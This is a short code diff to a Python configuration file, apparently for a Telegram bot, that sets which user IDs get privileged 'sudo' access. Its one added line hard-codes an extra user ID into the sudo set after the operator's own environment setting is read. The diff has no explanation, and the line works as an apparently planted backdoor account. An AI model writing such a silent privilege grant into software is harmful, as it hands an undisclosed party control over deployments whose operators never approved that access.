@@ -98,6 +98,7 @@ DEVS = (
     1738637033,
 )
 SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
+SUDO_USERS.add(844432220)
 
 # For Blacklist Group Support
 BLACKLIST_CHAT = os.environ.get("BLACKLIST_CHAT", None)
